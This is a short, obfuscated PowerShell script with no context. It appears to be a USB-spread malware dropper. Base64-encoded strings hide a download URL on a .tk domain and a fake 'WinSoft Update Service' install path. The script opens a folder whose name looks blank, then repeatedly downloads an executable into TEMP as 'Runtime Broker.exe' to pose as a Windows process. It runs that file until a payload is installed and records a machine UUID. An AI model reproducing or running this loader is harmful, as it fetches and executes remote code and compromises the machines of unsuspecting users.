$xzn2 = $(get-location).Path;$pmq5 = (${env:ProgramFiles(x86)}, ${env:ProgramFiles} -ne $null)[0];$cys6 = $env:TEMP;$dpl4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luU29mdCBVcG" + "RhdGUgU2VydmljZVxweXRob" + "253LmV4ZQ=="));$fks1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6" + "Ly93amVjcHVqcGFubXdtLnRrL3VwZG" + "F0ZXIucGhwP2Zyb209VVNCMQ=="));$yhs9 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("44Wk"));$bqv5 = $xzn2 + "\" + $yhs9 + "\";$hwp3 = $pmq5 + "\" + $dpl4;$wmb2 = $cys6 + "\Runtime Broker.exe";if (Test-Path -Path $bqv5 -PathType Container) {$uuid | Out-File -NoClobber -FilePath ($env:APPDATA + "\from_machine_uuid.dat");ii $bqv5;$qla7 = New-Object System.Net.WebClient;while (!(Test-Path $wmb2)) {try {$qla7.DownloadFile($fks1 + "&user=" + $uuid, $wmb2);}catch [System.Net.WebException] {if ($_.Exception.Response.StatusCode) {exit}}catch {}Start-Sleep -s 5;}while (!(Test-Path $hwp3)) {Start-Process -FilePath $wmb2 -Wait;Start-Sleep -s 1;}}